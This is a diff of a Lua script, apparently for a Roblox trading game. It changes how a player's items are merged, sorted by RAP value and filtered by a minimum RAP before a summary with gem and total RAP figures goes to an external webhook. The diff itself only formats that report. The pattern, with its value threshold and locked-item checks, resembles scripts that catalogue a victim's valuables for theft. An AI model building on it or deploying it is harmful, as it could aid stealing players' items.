@@ -64,12 +64,31 @@ local function SendMessage(url, username, diamonds)
 		}
 	}
 
-	for _, item in ipairs(sortedItems) do
-		fields[2].value = fields[2].value .. item.name .. ": " .. formatNumber(item.rap * item.amount) .. " RAP\n"
-		totalRAP = totalRAP + (item.rap * item.amount)
-	end
+    local combinedItems = {}
+    local itemRapMap = {}
+
+    for _, item in ipairs(sortedItems) do
+        local rapKey = item.name
+        if itemRapMap[rapKey] then
+            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
+        else
+            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
+            table.insert(combinedItems, rapKey)
+        end
+    end
+
+    table.sort(combinedItems, function(a, b)
+        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
+    end)
+
+    for _, itemName in ipairs(combinedItems) do
+        local itemData = itemRapMap[itemName]
+        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+        totalRAP = totalRAP + (itemData.rap * itemData.amount)
+    end
+
     fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
-	fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
+    fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
 
     local data = {
         ["embeds"] = {{
@@ -242,15 +261,14 @@ for i, v in pairs(categoryList) do
                         if item.sh then
                             prefix = "Shiny " .. prefix
                         end
-                        local id = prefix .. item.id .. " (x" .. (item._am and tostring(item._am) or "1") .. ")"
+                        local id = prefix .. item.id
                         table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                     end
                 end
             else
                 local rapValue = getRAP(v, item)
                 if rapValue >= min_rap then
-                    local id = item.id .. " (x" .. (item._am and tostring(item._am) or "1") .. ")"
-                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                 end
             end
             if item._lk then
